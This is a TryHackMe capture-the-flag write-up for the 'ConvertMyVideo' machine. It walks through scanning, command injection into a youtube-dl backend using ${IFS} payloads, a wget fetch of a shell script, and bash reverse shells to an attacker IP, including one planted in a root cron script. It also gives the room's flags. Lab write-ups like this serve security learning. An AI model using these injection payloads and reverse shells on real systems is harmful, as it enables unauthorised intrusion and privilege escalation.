---
title: "ConvertMyVideo"
date: 2025-02-14
slug: convertmyvideo
tags: [tryhackme, linux, web, privesc]
difficulty: Medium
---
IP = 10.10.152.241

**Enumeration**

```

❯ nmap -sCV 10.10.134.240
Starting Nmap 7.92 ( https://nmap.org ) at 2025-02-11 00:21 IST
Nmap scan report for 10.10.134.240
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)
|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)
|_  256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.06 seconds



```

SSH and HTTP are open 


```
❯ gobuster dir -u http://10.10.128.242 -w ~/ctf/wordlist/directory-list-2.3-medium.txt -x php,html,js,txt

/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 747]
/images               (Status: 301) [Size: 315] [--> http://10.10.128.242/images/]
/admin                (Status: 401) [Size: 460]
```


/index.php has 
```
$(function () {
    $("#convert").click(function () {
        $("#message").html("Converting...");
        $.post("/", { yt_url: "https://www.youtube.com/watch?v=" + $("#ytid").val() }, function (data) {
            try {
                data = JSON.parse(data);
                if(data.status == "0"){
                    $("#message").html("<a href='" + data.result_url + "'>Download MP3</a>");
                }
                else{
                    console.log(data);
                    $("#message").html("Oops! something went wrong");
                }
            } catch (error) {
                console.log(data);
                $("#message").html("Oops! something went wrong");
            }
        });
    });

});
```

code fetches the youtube video id and gives a POST req to backend service 

as the code uses
`$.post("/", { yt_url: "https://www.youtube.com/watch?v=" + $("#ytid").val() }, function (data) {`
we can determine the code is using AJAX in the backend 
AJAX (Asynchronous JavaScript and XML) allows web pages to communicate with a server **without reloading** the page. In your code, an AJAX `POST` request is used to send a YouTube URL to a backend server for conversion.

there is a potential vuln as the post req is directly sent to the **/** directory of the server





there is a /admin page 
![[Pasted image 20250210210418.png]]


IP changed = 10.10.134.240

for this there is a req and resp going in on the backend of the website so for this scenario we will use burp suite to monitor what is the data being sent and res from the server 

by entering random inputs in the video id section we get error in response of it 

```
{"status":1,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nERROR: Incomplete YouTube ID geg. URL https:\/\/www.youtube.com\/watch?v=geg looks truncated.\n","url_orginal":"https:\/\/www.youtube.com\/watch?v=geg","output":"","result_url":"\/tmp\/downloads\/67aa51b9425c6.mp3"}
```


searching for this error on youtube we find it as a error from ytdl 

so we know that the service is using ytdl in backend 

and from the command 
`$.post("/", { yt_url: "https://www.youtube.com/watch?v=" + $("#ytid").val() }, function (data) {`
this command adds link before the id variable we pass in and send it to ytdl on backend 

but here the code is stored in the client side so the convertion of the id to youtube link is done on the client side so using burp suit it is easy to convert the full link to a command and run it into a terminal


![[Pasted image 20250212191102.png]]


**Exploitation**
IP changed = 10.10.199.203

but any input we pass still goes through ytdl command 
for eg here 
when we pass `--help `
it goes through the code and gets executed as 
`ytdl --help`

so for this to not happen we will perform command injection 

eg -
`--help; whoami`
but spaces between command still doesn't work as it goes as input to a variable so we are using 

`--version;whoami;`
as the value of IFS is a blank space 

```
--version;ls${IFS}-al;
```

more on that on here - 
https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces?source=post_page-----e012e7db996---------------------------------------

input 
`yt_url=-i;ls${IFS}-al;`

filtered output 
```
total 36
drwxr-xr-x 6 www-data www-data 4096 Apr 12  2020 .
drwxr-xr-x 3 root     root     4096 Apr 12  2020 ..
-rw-r--r-- 1 www-data www-data  152 Apr 12  2020 .htaccess
drwxr-xr-x 2 www-data www-data 4096 Apr 12  2020 admin
drwxrwxr-x 2 www-data www-data 4096 Apr 12  2020 images
-rw-r--r-- 1 www-data www-data 1790 Apr 12  2020 index.php
drwxrwxr-x 2 www-data www-data 4096 Apr 12  2020 js
-rw-rw-r-- 1 www-data www-data  205 Apr 12  2020 style.css
drwxr-xr-x 2 www-data www-data 4096 Apr 12  2020 tmp
```


tried many revshell techniques directly forwarding code as parameter value from burpsuite 
but that didn't work

alternative to this is sending the commands as a file using python server on our machine 



```
❯ cat shell.sh
#~/bin/bash
bash -i >& /dev/tcp/10.17.26.44/9999 0>&1


❯ cd ctf/scripts

❯ python -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

`yt_url=-i;wget${IFS}http://10.17.26.44:8000/shell.sh;`

then using
`yt_url=-i;wget${IFS}http://10.17.26.44:8000/shell.sh;`

filtered output
```
total 40
drwxr-xr-x 6 www-data www-data 4096 Feb 14 11:50 .
drwxr-xr-x 3 root     root     4096 Apr 12  2020 ..
-rw-r--r-- 1 www-data www-data  152 Apr 12  2020 .htaccess
drwxr-xr-x 2 www-data www-data 4096 Apr 12  2020 admin
drwxrwxr-x 2 www-data www-data 4096 Apr 12  2020 images
-rw-r--r-- 1 www-data www-data 1790 Apr 12  2020 index.php
drwxrwxr-x 2 www-data www-data 4096 Apr 12  2020 js
-rw-r--r-- 1 www-data www-data   54 Feb 14 11:36 shell.sh
-rw-rw-r-- 1 www-data www-data  205 Apr 12  2020 style.css
drwxr-xr-x 2 www-data www-data 4096 Apr 12  2020 tmp
```


when using chmod we have to give absolute path for it to work 

```
yt_url=-i;chmod${IFS}755${IFS}/var/www/html/shell.sh;
```

also +x didn't work 


to run the shell use 
`yt_url=-i;bash${IFS}shell.sh;`

now we got rev shell connection 
```
❯ rlwrap nc -lnvp 9999
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 10.10.199.203.
Ncat: Connection from 10.10.199.203:34996.
bash: cannot set terminal process group (829): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dmv:/var/www/html$ 
```

```
www-data@dmv:/var/www/html/admin$ ls -al
ls -al
total 24
drwxr-xr-x 2 www-data www-data 4096 Apr 12  2020 .
drwxr-xr-x 6 www-data www-data 4096 Feb 14 12:28 ..
-rw-r--r-- 1 www-data www-data   98 Apr 12  2020 .htaccess
-rw-r--r-- 1 www-data www-data   49 Apr 12  2020 .htpasswd
-rw-r--r-- 1 www-data www-data   39 Apr 12  2020 flag.txt
-rw-rw-r-- 1 www-data www-data  202 Apr 12  2020 index.php
www-data@dmv:/var/www/html/admin$ cat .htpasswd
cat .htpasswd
itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/
```


```
www-data@dmv:/var/www/html/admin$ cat flag.txt
cat flag.txt
flag{0d8486a0c0c42503bb60ac77f4046ed7}
```

**Privilege Escalation**

trying for privEsc 

looking for cornjobs by downloading the pspy file into the machine and running it 

```
wget http://10.17.26.44:8000/pspy64
--2025-02-14 12:37:10--  http://10.17.26.44:8000/pspy64
Connecting to 10.17.26.44:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: 'pspy64'

pspy64              100%[===================>]   2.96M   594KB/s    in 5.6s    

2025-02-14 12:37:16 (545 KB/s) - 'pspy64' saved [3104768/3104768]

www-data@dmv:/var/www/html/tmp$ chmod +x pspy64
chmod +x pspy64
www-data@dmv:/var/www/html/tmp$ ./pspy64
./pspy64


```


pspy output 
```
2025/02/14 12:38:42 CMD: UID=0     PID=9      | 
2025/02/14 12:38:42 CMD: UID=0     PID=8      | 
2025/02/14 12:38:42 CMD: UID=0     PID=7      | 
2025/02/14 12:38:42 CMD: UID=0     PID=6      | 
2025/02/14 12:38:42 CMD: UID=0     PID=4      | 
2025/02/14 12:38:42 CMD: UID=0     PID=2      | 
2025/02/14 12:38:42 CMD: UID=0     PID=1      | /sbin/init maybe-ubiquity 
2025/02/14 12:39:01 CMD: UID=0     PID=3433   | bash /var/www/html/tmp/clean.sh 
2025/02/14 12:39:01 CMD: UID=0     PID=3432   | /bin/sh -c cd /var/www/html/tmp && bash /var/www/html/tmp/clean.sh 
2025/02/14 12:39:01 CMD: UID=0     PID=3430   | /usr/sbin/CRON -f 
2025/02/14 12:39:01 CMD: UID=0     PID=3434   | rm -rf downloads 
2025/02/14 12:39:09 CMD: UID=0     PID=3451   | /bin/sh -e /usr/lib/php/sessionclean 
2025/02/14 12:39:09 CMD: UID=0     PID=3450   | /bin/sh -e /usr/lib/php/sessionclean 
2025/02/14 12:39:09 CMD: UID=0     PID=3449   | 
2025/02/14 12:39:09 CMD: UID=0     PID=3448   | 
```

we can see the clean.sh is called as a cornjob which is potential privEsc vector 

```
www-data@dmv:/var/www/html/tmp$ ls -al
ls -al
total 3044
drwxr-xr-x 2 www-data www-data    4096 Feb 14 12:37 .
drwxr-xr-x 6 www-data www-data    4096 Feb 14 12:28 ..
-rw-r--r-- 1 www-data www-data      19 Feb 14 12:42 clean.sh
-rwxr-xr-x 1 www-data www-data 3104768 Feb 14 12:36 pspy64
```

also we can write onto this script 

using command 
```
cat clean.sh
rm -rf downloads
www-data@dmv:/var/www/html/tmp$ echo "bash -i >& /dev/tcp/10.17.26.44/9090 0>&1" > clean.sh
<sh -i >& /dev/tcp/10.17.26.44/9090 0>&1" > clean.sh
www-data@dmv:/var/www/html/tmp$ cat clean.sh
cat clean.sh
bash -i >& /dev/tcp/10.17.26.44/9090 0>&1

```

and setting up a listner on port 9090
we get root shell connection back 
```
❯ rlwrap nc -lnvp 9090
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9090
Ncat: Listening on 0.0.0.0:9090
Ncat: Connection from 10.10.199.203.
Ncat: Connection from 10.10.199.203:58626.
bash: cannot set terminal process group (3563): Inappropriate ioctl for device
root@dmv:/var/www/html/tmp# cat /root/root.txt
cat /root/root.txt
flag{d9b368018e912b541a4eb68399c5e94a}
```

**Answers**

secret file - admin

belongs to - itsmeadmin 

user flag - flag{0d8486a0c0c42503bb60ac77f4046ed7}

root flag - flag{d9b368018e912b541a4eb68399c5e94a}


----
- SQLi on forms if the appear (didn't work but still try)
- always try to give absolute path of file for any remote code executions you are doing on the target 
- always try to use alternatives of a command if your command doesn't work at time of command injection
- look for cornjobs use pspy more
